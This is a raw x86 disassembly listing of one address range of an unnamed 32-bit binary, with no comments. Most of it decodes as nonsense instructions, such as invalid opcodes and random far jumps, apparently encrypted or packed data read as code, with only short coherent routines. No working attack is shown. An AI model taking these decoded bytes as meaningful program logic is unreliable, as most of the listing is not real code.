  4060ca:	push   ebp
  4060cb:	sahf   
  4060cc:	adc    al,0xd7
  4060ce:	push   esi
  4060cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060d0:	mov    esp,0x19ec552f
  4060d5:	xchg   edx,eax
  4060d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d7:	pop    eax
  4060d8:	mov    al,0x60
  4060da:	into   
  4060db:	jo     0x4060f6
  4060dd:	jmp    0x406130
  4060df:	out    0xb0,eax
  4060e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060e2:	push   esp
  4060e3:	arpl   WORD PTR [ecx+0x59],di
  4060e6:	arpl   WORD PTR [edx-0x49],si
  4060e9:	fcomp  DWORD PTR [eax]
  4060eb:	mov    al,0xa9
  4060ed:	jmp    0xa31d:0xc9da5572
  4060f4:	add    eax,0xba1ab909
  4060f9:	rol    BYTE PTR [edi+0x63],cl
  4060fc:	jle    0x4060d9
  4060fe:	mov    al,cl
  406100:	jnp    0x406174
  406102:	jmp    0x41d4:0x9553c8e3
  406109:	xchg   BYTE PTR [edi-0x76bb36d2],bl
  40610f:	stc    
  406110:	(bad)  
  406111:	mov    esp,0x2e886aa1
  406116:	sahf   
  406117:	lahf   
  406118:	fstp   DWORD PTR [edi+edi*2-0x1b]
  40611c:	test   BYTE PTR ds:0xbf1e2a87,cl
  406122:	mov    bl,0x85
  406124:	popf   
  406125:	sbb    BYTE PTR [ebp+0x39f89b],ch
  40612b:	sub    edi,DWORD PTR [eax]
  40612d:	or     dh,BYTE PTR [ebx+eax*1]
  406130:	fisub  WORD PTR [ebx+esi*4-0x4f7c5be4]
  406137:	xchg   DWORD PTR [edx+0x44f6d85],ebp
  40613d:	jae    0x40611a
  40613f:	nop
  406140:	and    eax,0xcbdaa04b
  406145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406146:	mov    ah,0x26
  406148:	dec    ecx
  406149:	push   es
  40614a:	or     BYTE PTR [esi+eax*1],0xca
  40614e:	mov    al,0xce
  406150:	not    dl
  406152:	mov    ah,0xad
  406154:	fcmove st,st(2)
  406156:	xchg   DWORD PTR [ebp-0x245f558f],ebp
  40615c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40615d:	fsubr  DWORD PTR [esi-0x1c]
  406160:	sbb    edi,DWORD PTR [ebp+0x69]
  406163:	mov    ebp,0xefed84e4
  406168:	(bad)  [ebx+edi*4]
  40616b:	sbb    esp,esp
  40616d:	mov    dh,0x2
  40616f:	cmp    BYTE PTR [ecx],al
  406171:	cmp    BYTE PTR [ebp+0x6c],ch
  406174:	loop   0x40618c
  406176:	mov    esp,0x30ee2015
  40617b:	lahf   
  40617c:	stos   DWORD PTR es:[edi],eax
  40617d:	outs   dx,DWORD PTR ds:[esi]
  40617e:	pop    edx
  40617f:	dec    ebp
  406180:	ds xor bh,bh
  406183:	stc    
  406184:	minps  xmm7,XMMWORD PTR [edx+0x7f2c7050]
  40618b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40618c:	int3   
  40618d:	xor    BYTE PTR [esi+0x2c],0xc4
  406191:	ins    BYTE PTR es:[edi],dx
  406192:	push   cs
  406193:	aam    0x76
  406195:	sar    bl,1
  406197:	add    DWORD PTR [ecx],ebp
  406199:	(bad)  
  40619a:	shl    DWORD PTR [eax-0x10a27fb0],cl
  4061a0:	push   ebx
  4061a1:	pop    edi
  4061a2:	aad    0x82
  4061a4:	addr16 dec edi
  4061a6:	nop
  4061a7:	adc    edx,DWORD PTR [edi]
  4061a9:	addr16 dec ebx
  4061ab:	sub    bh,BYTE PTR [edi+0x3cfb5783]
  4061b1:	outs   dx,DWORD PTR ds:[esi]
  4061b2:	xor    DWORD PTR [esi],0x37
  4061b5:	nop
  4061b6:	and    BYTE PTR [esi],0x2a
  4061b9:	mov    eax,0xe354eeee
  4061be:	and    edi,ebp
  4061c0:	pop    ebp
  4061c1:	and    edi,DWORD PTR [edi]
  4061c3:	mov    DWORD PTR [ebx+0x32ed3694],ebp
  4061c9:	push   0x847266a0
  4061ce:	aaa    
  4061cf:	mov    edx,0x42957ec1
  4061d4:	stc    
  4061d5:	fmul   st(1),st
  4061d7:	dec    edi
  4061d8:	cld    
  4061d9:	lahf   
  4061da:	xchg   BYTE PTR [esi+0x32],bh
  4061dd:	fsub   st(5),st
  4061df:	fs lahf 
  4061e1:	xchg   dl,dl
  4061e3:	js     0x406244
  4061e5:	push   DWORD PTR [ebp+0x50f646fe]
  4061eb:	aaa    
  4061ec:	sub    BYTE PTR [edi],dh
  4061ee:	mov    al,0x86
  4061f0:	dec    ecx
  4061f1:	pop    esi
  4061f2:	xchg   esp,eax
  4061f3:	leave  
  4061f4:	xchg   BYTE PTR [edi+0x5b],ah
  4061f7:	(bad)  
  4061f8:	cwde   
  4061f9:	sbb    cl,ch
  4061fb:	jnp    0x4061d6
  4061fd:	ja     0x406244
  4061ff:	scas   al,BYTE PTR es:[edi]
  406200:	and    BYTE PTR [edi-0x3187cd9a],cl
  406206:	jae    0x40621f
  406208:	leave  
  406209:	int3   
  40620a:	call   0x551d4f4e
  40620f:	dec    ebx
  406210:	cmc    
  406211:	or     DWORD PTR [esi-0x1bb41334],edx
  406217:	fs push ecx
  406219:	rcr    BYTE PTR [edx+0x31],cl
  40621c:	mov    al,ds:0x863910c4
  406221:	mov    bh,0x53
  406223:	arpl   WORD PTR [esi-0x7f],bp
  406226:	and    DWORD PTR es:[esi+0xd],0x820e0a36
  40622e:	cmp    al,BYTE PTR [esi]
  406230:	iret   
  406231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406232:	mov    BYTE PTR [edx],0x5a
  406235:	add    al,0x30
  406237:	sub    ecx,ebp
  406239:	push   0x9e77b109
  40623e:	sbb    eax,0x43e3a1b5
  406243:	xchg   esi,eax
  406244:	call   0x2c2875b
  406249:	imul   edi,esi,0x30
  40624c:	sub    bl,0x2d
  40624f:	cmp    DWORD PTR [edi-0x758e4863],edi
  406255:	inc    edi
  406256:	cmp    esi,DWORD PTR [eax*4+0x5dd0fd78]
  40625d:	popf   
  40625e:	adc    al,0xac
  406260:	jmp    0x77d6:0x9fd9477e
  406267:	inc    ebp
  406268:	dec    BYTE PTR [ecx-0x12]
  40626b:	rol    edx,cl
  40626d:	addr16 gs push 0xffffffb1
  406271:	mov    al,0x66
  406273:	ficomp WORD PTR [edi-0x655bb20f]
  406279:	out    0x73,eax
  40627b:	fs mov al,0xb8
  40627e:	icebp  
  40627f:	inc    edx
  406280:	fstp   QWORD PTR [edx-0x75]
  406283:	cmp    al,0x87
  406285:	pop    esi
  406286:	cmp    al,0x33
  406288:	adc    BYTE PTR [ecx+ebx*1+0x4b410891],ah
  40628f:	push   edi
  406290:	pop    edx
  406291:	add    BYTE PTR [esi],dh
  406293:	int    0x4e
  406295:	sahf   
  406296:	mov    edx,0x758b69c0
  40629b:	clc    
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43361f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	push   edi
  4062ed:	jno    0x4062d7
  4062ef:	dec    esp
  4062f0:	xor    al,0x3b
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x40630a
  4062f9:	out    0x3a,al
  4062fb:	mov    ecx,fs
  4062fd:	lods   al,BYTE PTR ds:[esi]
  4062fe:	in     eax,dx
  4062ff:	sub    esp,esp
  406301:	push   eax
  406302:	dec    ecx
  406303:	enter  0xfd09,0x40
  406307:	sbb    DWORD PTR [ebp+0x7c],esp
  40630a:	mov    ah,0xd7
  40630c:	adc    edx,esi
  40630e:	jle    0x406336
  406310:	mov    edi,ds
  406312:	icebp  
  406313:	in     al,0x31
  406315:	mov    ebx,0xecbab9bd
  40631a:	xchg   ebx,esp
  40631c:	mov    dh,0xe2
  40631e:	or     ebp,DWORD PTR [ecx]
  406320:	push   esi
  406321:	jo     0x4062f9
  406323:	imul   ecx,DWORD PTR ds:0x2d2bf6bf,0x4b6cdf1e
  40632d:	and    eax,0x4a03b12f
  406332:	es sbb eax,0x4c930430
  406338:	xlat   BYTE PTR ds:[ebx]
  406339:	cmp    edi,eax
  40633b:	adc    eax,0x9ce5ba79
  406340:	shl    DWORD PTR [eax+0x2a],cl
  406343:	adc    DWORD PTR [eax],esi
  406345:	je     0x4063ae
  406347:	out    0xaa,eax
  406349:	pop    edx
  40634a:	inc    esi
  40634b:	push   eax
  40634c:	xchg   edx,eax
  40634d:	pop    ebx
  40634e:	pop    ebx
  40634f:	test   bl,bh
  406351:	daa    
  406352:	iret   
  406353:	enter  0x601b,0x82
  406357:	inc    esp
  406358:	jnp    0x406381
  40635a:	inc    edi
  40635b:	and    bh,dh
  40635d:	js     0x406397
  40635f:	adc    eax,0xffffff96
  406362:	cmp    al,0xdf
  406364:	out    dx,al
  406365:	sub    DWORD PTR [esi-0x509daabf],ebx
  40636b:	cld    
  40636c:	call   0xfd6e3d7f
  406371:	mov    ebp,0x2c4ce57c
  406376:	leave  
  406377:	mov    esp,0x11e8da85
  40637c:	adc    esi,DWORD PTR [edx]
  40637e:	mov    edx,DWORD PTR [esi]
  406380:	call   0xb57f:0xf3af5ba1
  406387:	dec    ecx
  406388:	sub    DWORD PTR [ebx+0x54],ecx
  40638b:	or     cl,BYTE PTR [esp+ebx*8+0x13c9646c]
  406392:	sbb    al,0x3a
  406394:	sbb    ebp,DWORD PTR [eax*4-0x10e32442]
  40639b:	iret   
  40639c:	fisub  WORD PTR [edi]
  40639e:	xor    DWORD PTR [ecx+0x73],ebx
  4063a1:	mov    ?,WORD PTR [ebx+ecx*8+0x69]
  4063a5:	lods   eax,DWORD PTR ds:[esi]
  4063a6:	call   0x56980c42
  4063ab:	cmp    BYTE PTR [edx+0x21a3ec5c],dl
  4063b1:	xor    BYTE PTR [ecx-0x7daf2aa5],0xe6
  4063b8:	scas   al,BYTE PTR es:[edi]
  4063b9:	leave  
  4063ba:	inc    esp
  4063bb:	shl    ch,1
  4063bd:	cmp    al,0x0
  4063bf:	sbb    edx,DWORD PTR [eax-0x830f366]
  4063c5:	arpl   WORD PTR [edx+0x62],dx
  4063c8:	push   eax
  4063c9:	jne    0x406448
  4063cb:	mov    ds,WORD PTR [edi]
  4063cd:	sub    ebp,DWORD PTR [ecx-0x5]
  4063d0:	mov    cl,0xdc
  4063d2:	jmp    0x29b0:0x106d95e6
  4063d9:	in     al,0x32
  4063db:	and    eax,0x2cb7c00b
  4063e0:	and    BYTE PTR [ecx-0x3a914a73],bl
  4063e6:	or     al,BYTE PTR [ebp-0x5c]
  4063e9:	xchg   ebx,eax
  4063ea:	jle    0x406461
  4063ec:	push   es
  4063ed:	push   ds
  4063ee:	jg     0x40643d
  4063f0:	sub    bh,ch
  4063f2:	lds    eax,FWORD PTR [eax+0x69]
  4063f5:	loop   0x406466
  4063f7:	mov    ds:0x958a5ef8,eax
  4063fc:	fistp  QWORD PTR [esi+0x2851393c]
  406402:	sub    al,0x68
  406404:	scas   eax,DWORD PTR es:[edi]
  406405:	out    0xa0,eax
  406407:	add    ecx,DWORD PTR [edx+0x5ce81716]
  40640d:	hlt    
  40640e:	dec    esp
  40640f:	cs sub eax,0x17419ea8
  406415:	fcomp  DWORD PTR [edi+0x6b73cd9e]
  40641b:	lahf   
  40641c:	gs es xchg esi,eax
  40641f:	xchg   edi,eax
  406420:	in     eax,dx
  406421:	xor    ah,BYTE PTR [eax-0x1c3f5f55]
  406427:	adc    dl,dl
  406429:	pushf  
  40642a:	push   edx
  40642b:	mov    ebp,0x70729d4e
  406430:	dec    ebp
  406431:	adc    DWORD PTR [esi-0x1ab673c2],esp
  406437:	aaa    
  406438:	stos   BYTE PTR es:[edi],al
  406439:	mov    bh,0x3
  40643b:	clc    
  40643c:	mov    ebx,0x3e71d09a
  406441:	push   cs
  406442:	cmc    
  406443:	ds cmp al,0xbf
  406446:	fadd   QWORD PTR [esi]
  406448:	out    dx,eax
  406449:	jl     0x406485
  40644b:	inc    esp
  40644c:	inc    ebp
  40644d:	repz mov cl,0x7a
  406450:	dec    eax
  406451:	icebp  
  406452:	out    dx,al
  406453:	or     esi,DWORD PTR [eax]
  406455:	jl     0x4064d2
  406457:	int3   
  406458:	fadd   QWORD PTR [eax+0x3186ad8a]
  40645e:	push   esi
  40645f:	(bad)  
  406460:	and    al,0x17
  406462:	sub    eax,0xf3eb1eca
  406467:	sub    DWORD PTR [ebp+0x9442898],0xbc1a3cd2
  406471:	lock shr DWORD PTR fs:[eax],0xeb
  406476:	loopne 0x406443
  406478:	jb     0x406405
  40647a:	ins    DWORD PTR es:[edi],dx
  40647b:	xlat   BYTE PTR ds:[ebx]
  40647c:	pop    edi
  40647d:	scas   eax,DWORD PTR es:[edi]
  40647e:	(bad)  
  40647f:	xor    al,0xcd
  406481:	cmp    dh,BYTE PTR [eax-0x5e47138c]
  406487:	dec    ebp
  406488:	out    0x9c,eax
  40648a:	ins    BYTE PTR es:[edi],dx
  40648b:	retf   0x8304
  40648e:	mov    ecx,0xdc9e6980
  406493:	hlt    
  406494:	ret    
  406495:	int3   
  406496:	fist   WORD PTR [edx-0x21d59809]
  40649c:	(bad)  
  40649d:	mov    al,0xe3
  40649f:	out    dx,eax
  4064a0:	daa    
  4064a1:	dec    ebx
  4064a2:	out    dx,al
  4064a3:	add    eax,edi
  4064a5:	call   0x97e7:0x375d175c
  4064ac:	ja     0x4064ee
  4064ae:	(bad)  
  4064af:	out    0xf5,eax
  4064b1:	jle    0x4064d8
  4064b3:	sbb    dh,BYTE PTR [ebx+0x1c1411a5]
  4064b9:	or     eax,0xb7fd0010
  4064be:	inc    esp
  4064bf:	cmp    al,al
  4064c1:	data16 je 0x4064db
  4064c4:	pop    esp
  4064c5:	pop    eax
  4064c6:	jb     0x4064be
  4064c8:	and    esi,esp
  4064ca:	out    0xdd,eax
  4064cc:	ds cmp ecx,ebx
  4064cf:	call   0x92f89707
  4064d4:	pushf  
  4064d5:	hlt    
  4064d6:	fnsave [esi]
  4064d8:	lock aas 
  4064da:	mov    eax,0x12895f38
  4064df:	cli    
  4064e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e1:	pop    ds
  4064e2:	repnz sbb bl,BYTE PTR [edi+ecx*1]
  4064e6:	and    eax,0xa86b901d
  4064eb:	jp     0x4064df
  4064ed:	pop    esi
  4064ee:	retf   
  4064ef:	test   al,0x28
  4064f1:	icebp  
  4064f2:	push   ecx
  4064f3:	(bad)  
  4064f5:	or     BYTE PTR [edx+0x20b1aaab],0xb7
  4064fc:	inc    edi
  4064fd:	sub    al,0xb8
  4064ff:	aaa    
  406500:	shr    DWORD PTR [esi+0x2c718ed8],1
  406506:	jno    0x406491
  406508:	lods   al,BYTE PTR ds:[esi]
  406509:	pusha  
  40650a:	xor    eax,DWORD PTR [edx+ecx*4]
  40650d:	add    eax,0xf5a532e
  406512:	cwde   
  406513:	and    cl,BYTE PTR [ebx-0x68]
  406516:	lods   al,BYTE PTR ds:[esi]
  406517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406518:	xchg   ecx,eax
  406519:	jb     0x4064cb
  40651b:	sub    eax,ebx
  40651d:	push   ds
  40651e:	addr16 retf 0xfc4b
  406522:	ror    DWORD PTR [edi],1
  406524:	cmc    
  406525:	jp     0x4064eb
  406527:	mov    ds:0x763ce795,al
  40652c:	je     0x40651a
  40652e:	mov    ch,bl
  406530:	dec    edi
  406531:	adc    ah,al
  406533:	and    edx,DWORD PTR [ecx-0x48]
  406536:	or     DWORD PTR [eax+0x0],0xfc9eb800
  40653d:	mov    ds:0xfc458905,eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x433627,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x4336df,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x4335db,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x43365f,0x0
  406580:	mov    ecx,DWORD PTR ds:0x43365f
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x43365f,ecx
  40658d:	cmp    DWORD PTR ds:0x43365f,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x43365f,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x43365f
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x43365f,ecx
  4065bf:	cmp    DWORD PTR ds:0x43365f,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xd295211a
  4065de:	or     ch,0x3
  4065e1:	call   0x30bce2ab
  4065e6:	jle    0x406664
  4065e8:	jl     0x406611
  4065ea:	lahf   
  4065eb:	out    dx,al
  4065ec:	mov    ds:0x659ccfd8,eax
  4065f1:	sub    ecx,DWORD PTR [ebx+0x41]
  4065f4:	fxch   st(2)
  4065f6:	xor    dl,BYTE PTR [esi+0x76d7ff46]
  4065fc:	xchg   DWORD PTR [ebp+0x6074c0fa],esi
  406602:	xchg   ebp,eax
  406603:	adc    al,0x22
  406605:	mov    edx,0x3361e1c3
  40660a:	sub    DWORD PTR [ebx],0x96ab0570
  406610:	add    ebx,DWORD PTR [ebx]
  406612:	jmp    0x4065a9
  406614:	xor    eax,0x58f49d38
  406619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40661a:	mov    ch,0x1d
  40661c:	addr16 adc eax,0x9a2db219
  406622:	push   edx
  406623:	xchg   esp,eax
  406624:	hlt    
  406625:	fld    TBYTE PTR [esi-0x2b051030]
  40662b:	adc    al,0xd1
  40662d:	outs   dx,BYTE PTR ds:[esi]
  40662e:	mov    ds:0x45c600f8,al
  406633:	fnstsw WORD PTR [ecx+0xc]
  406636:	arpl   WORD PTR [ebp+0x34],si
  406639:	loop   0x406619
  40663b:	mov    eax,ds:0xafb469cb
  406640:	mov    ds:0x9c5c5802,eax
  406645:	gs push eax
  406647:	push   esp
  406648:	fst    DWORD PTR [eax-0xe9aa74c]
  40664e:	or     BYTE PTR [ebx-0x46106d8b],ch
  406654:	mov    eax,ds:0x78621acd
  406659:	retf   
  40665a:	push   es
  40665b:	jnp    0x406625
  40665d:	div    DWORD PTR [eax]
  40665f:	test   al,0x5b
  406661:	or     al,0x28
  406663:	das    
  406664:	ss stos BYTE PTR es:[edi],al
  406666:	sub    DWORD PTR [edx-0x30fb32a8],0x3842f362
  406670:	mov    WORD PTR [ecx-0x13bf7abc],es
  406676:	pop    ebp
  406677:	sbb    al,0x40
  406679:	jne    0x406607
  40667b:	test   al,0x15
  40667d:	and    eax,0x7fd91a5b
  406682:	mov    bh,0x85
  406684:	test   bl,dh
  406686:	dec    edx
  406687:	mov    ds:0x8b12160c,eax
  40668c:	(bad)  
  40668d:	jmp    0x4066ee
  40668f:	loop   0x4066ce
  406691:	stos   BYTE PTR es:[edi],al
  406692:	jge    0x40665e
  406694:	sbb    BYTE PTR [ebx+0x7b],dh
  406697:	xor    al,0xf8
  406699:	and    eax,0xae70b132
  40669e:	lds    ecx,FWORD PTR [edi-0x68eda79d]
  4066a4:	dec    esp
  4066a5:	jl     0x406710
  4066a7:	mov    al,ds:0x76b34282
  4066ac:	imul   esi,DWORD PTR [ebx+0x10a73eae],0x44
  4066b3:	mov    dl,0xa8
  4066b5:	cwde   
  4066b6:	ret    0x463f
  4066b9:	add    esi,DWORD PTR [ebx]
  4066bb:	xchg   dl,dl
  4066bd:	sbb    eax,0x4df98dec
  4066c2:	sub    dh,BYTE PTR [ecx]
  4066c4:	fist   WORD PTR [eax]
  4066c6:	xor    edx,edx
  4066c8:	pop    ebx
  4066c9:	mov    ecx,0x19122ee6
  4066ce:	push   edi
  4066cf:	mov    esp,0xd698116d
  4066d4:	xchg   ebx,eax
  4066d5:	fdivr  DWORD PTR [eax]
  4066d7:	xchg   edi,eax
  4066d8:	je     0x406747
  4066da:	mov    esi,DWORD PTR [ecx]
  4066dc:	arpl   WORD PTR [eax+0x34],cx
  4066df:	std    
  4066e0:	arpl   cx,ax
  4066e2:	lods   eax,DWORD PTR ds:[esi]
  4066e3:	out    dx,eax
  4066e4:	mov    WORD PTR [ebx+esi*4-0x76],?
  4066e8:	retf   
  4066e9:	nop
  4066ea:	pop    esp
  4066eb:	sbb    ebx,DWORD PTR [esi-0x3c]
  4066ee:	iret   
  4066ef:	or     al,0x6
  4066f1:	popa   
  4066f2:	inc    esi
  4066f3:	fdiv   DWORD PTR [ebp-0x85ed314]
  4066f9:	(bad)  
  4066fa:	mov    ?,WORD PTR [edx+0x33]
  4066fd:	xchg   ebx,eax
  4066fe:	into   
  4066ff:	enter  0xe76d,0xf0
  406703:	jnp    0x4066f1
  406705:	ror    bl,cl
  406707:	(bad)  
  406708:	jg     0x406705
  40670a:	sub    DWORD PTR [eax],esi
  40670c:	retf   
  40670d:	stos   DWORD PTR es:[edi],eax
  40670e:	in     eax,dx
  40670f:	(bad)  
  406710:	fcmovnb st,st(1)
  406712:	lds    ebp,FWORD PTR [edx-0x56]
  406715:	loop   0x40671b
  406717:	mov    eax,0x647badac
  40671c:	stc    
  40671d:	sbb    DWORD PTR [ebp-0x3f608e30],0xffffffda
  406724:	je     0x406778
  406726:	xchg   ebp,eax
  406727:	jae    0x40672e
  406729:	fucomip st,st(3)
  40672b:	xchg   ebx,esp
  40672d:	mov    ch,BYTE PTR [esi+0x3953043a]
  406733:	cld    
  406734:	sbb    DWORD PTR [eax],0xffffffa6
  406737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406738:	sbb    eax,DWORD PTR [ebp+0x7f]
  40673b:	stc    
  40673c:	mov    eax,ds:0xba3cc2c
  406741:	pop    ss
  406742:	xor    al,0x26
  406744:	dec    ebx
  406745:	into   
  406746:	pop    edx
  406747:	ins    DWORD PTR es:[edi],dx
  406748:	or     esp,ecx
  40674a:	sub    eax,0x1afb9b08
  40674f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406750:	xor    ecx,ebx
  406752:	mov    dh,0x9f
  406754:	or     al,BYTE PTR [ebx]
  406756:	push   ds
  406757:	rcl    DWORD PTR [eax+0x19fa56dd],cl
  40675d:	scas   al,BYTE PTR es:[edi]
  40675e:	jmp    0x40679f
  406760:	in     al,0xb2
  406762:	xchg   ecx,eax
  406763:	scas   eax,DWORD PTR es:[edi]
  406764:	and    dl,BYTE PTR [ebp+edx*8-0x26f38752]
  40676b:	pop    edi
  40676c:	iret   
  40676d:	out    dx,eax
  40676e:	push   eax
  40676f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406770:	add    BYTE PTR [esi],0x27
  406773:	fiadd  WORD PTR [edi+0x5960bd40]
  406779:	test   al,0xcf
  40677b:	jl     0x4067ca
  40677d:	loopne 0x406793
  40677f:	retf   0x2e83
  406782:	arpl   si,cx
  406784:	test   eax,0xfa9e5a09
  406789:	dec    edi
  40678a:	test   al,0x5f
  40678c:	mov    esi,0x1ab99867
  406791:	pop    ds
  406792:	call   0x5050:0xbd19b8b4
  406799:	scas   al,BYTE PTR es:[edi]
  40679a:	in     al,dx
  40679b:	xchg   esp,eax
  40679c:	rcr    dh,0x44
  40679f:	push   edi
  4067a0:	xor    BYTE PTR [eax+0x79f830f0],dl
  4067a6:	push   ecx
  4067a7:	and    BYTE PTR [ecx+0x47629fcb],dh
  4067ad:	loopne 0x4067ea
  4067af:	outs   dx,BYTE PTR ds:[esi]
  4067b0:	mov    eax,0xbd008d0e
  4067b5:	div    DWORD PTR [edx+ecx*4+0x2c7d3fca]
  4067bc:	in     eax,0x0
  4067be:	sub    DWORD PTR [edi+0x5c06b257],ecx
  4067c4:	xchg   ebx,eax
  4067c5:	fwait
  4067c6:	rol    BYTE PTR [ebp-0x75],0xa4
  4067ca:	jae    0x406799
  4067cc:	dec    edx
  4067cd:	mov    WORD PTR [ebx],?
  4067cf:	mov    dh,0x28
  4067d1:	es add eax,0x1750365
  4067d7:	jp     0x40684c
  4067d9:	push   ecx
  4067da:	mov    eax,0x57571bc0
  4067df:	icebp  
  4067e0:	cdq    
  4067e1:	dec    edx
  4067e2:	aas    
  4067e3:	xor    ah,BYTE PTR [eax]
  4067e5:	retf   0xae56
  4067e8:	mov    cl,BYTE PTR [ebp+0x205cd898]
  4067ee:	dec    DWORD PTR [ebp-0x4b]
  4067f1:	test   BYTE PTR [ecx-0x601f33cc],0xe2
  4067f8:	rol    dh,cl
  4067fa:	fist   DWORD PTR [edi-0xe161b51]
  406800:	adc    al,0x65
  406802:	mov    BYTE PTR [ebx+0x4e],bh
  406805:	ret    0x34f0
  406808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406809:	dec    esi
  40680a:	test   al,0x95
  40680c:	add    DWORD PTR [ebx],esp
  40680e:	adc    BYTE PTR [esi+edx*2-0x443700d],ch
  406815:	jge    0x406798
  406817:	mov    cs,WORD PTR [edi+0x57]
  40681a:	shl    DWORD PTR [ebp-0x7ece8046],1
  406820:	popa   
  406821:	and    DWORD PTR ds:0x3ab9f9d9,edi
  406827:	mov    al,BYTE PTR [eax]
  406829:	add    cl,ch
  40682b:	push   esp
  40682c:	add    al,BYTE PTR [eax]
  40682e:	add    BYTE PTR [eax],cl
  406830:	int3   
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xee5dc1cb
  40683e:	push   ebp
  40683f:	lods   al,BYTE PTR ds:[esi]
  406840:	(bad)  
  406841:	jl     0x4068bf
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x40687a
  406848:	(bad)  
  406849:	jge    0x4067d5
  40684b:	sbb    BYTE PTR [ebx],dh
  40684d:	ja     0x4068c6
  40684f:	xlat   BYTE PTR ds:[ebx]
  406850:	pop    edx
  406851:	imul   eax,edi,0x3745c115
  406857:	push   ds
  406858:	ror    BYTE PTR [eax],0x2a
  40685b:	and    esi,DWORD PTR [edi-0xb9a815e]
  406861:	sub    al,0x43
  406863:	jle    0x406828
  406865:	cmp    BYTE PTR [edx-0x3],ch
  406868:	gs add ebp,esi
  40686b:	jecxz  0x406884
  40686d:	test   al,0xd3
  40686f:	mov    bl,0xac
  406871:	and    BYTE PTR [esi+0x1951a60c],bl
  406877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406878:	sub    BYTE PTR [eax],bh
  40687a:	push   es
  40687b:	sahf   
  40687c:	pop    edi
  40687d:	loopne 0x406842
  40687f:	popa   
  406880:	test   al,0xb9
  406882:	sahf   
  406883:	jne    0x406888
  406885:	in     eax,0x52
  406887:	xor    esi,DWORD PTR [ecx+0x57dad344]
  40688d:	pop    edx
  40688e:	adc    eax,0x642f854d
  406893:	sub    al,0xa1
  406896:	mov    DWORD PTR [esi+0xe8f8ca],ecx
  40689c:	pop    edi
  40689d:	aad    0xac
  40689f:	aas    
  4068a0:	mov    WORD PTR [ebx-0x3a98a2a4],?
  4068a6:	mov    ah,0xf6
  4068a8:	repnz mov dh,0x64
  4068ab:	jp     0x40687e
  4068ad:	inc    edx
  4068ae:	test   ebp,esp
  4068b0:	stc    
  4068b1:	jno    0x406904
  4068b3:	es or  dh,ah
  4068b6:	sub    BYTE PTR [edx+0x59],dh
  4068b9:	sub    al,0xd4
  4068bb:	inc    ecx
  4068bc:	and    ah,BYTE PTR [edi+0x2c8715b7]
  4068c2:	bnd jmp 0xc14447e6
  4068c8:	mov    eax,0x991623c0
  4068cd:	mov    esp,0xcbc9e963
  4068d2:	push   ebp
  4068d3:	out    dx,eax
  4068d4:	cmp    BYTE PTR [eax],al
  4068d6:	jo     0x406879
  4068d8:	loop   0x40690a
  4068da:	ss leave 
  4068dc:	cmp    DWORD PTR [eax+0x1ca49dde],0x60
  4068e3:	clc    
  4068e4:	sbb    BYTE PTR [ebx-0x3e],ah
  4068e7:	imul   edx,eax,0xffffff8d
  4068ea:	mov    esi,fs
  4068ec:	push   esi
  4068ed:	popw   ds
  4068ef:	aad    0x83
  4068f1:	imul   ebp,DWORD PTR [eax],0x9ad2d95
  4068f7:	in     eax,dx
  4068f8:	les    esp,FWORD PTR [eax-0x64]
  4068fb:	adc    BYTE PTR [edx],bh
  4068fd:	lock jno 0x406917
  406900:	mov    eax,ds:0x7354d9ec
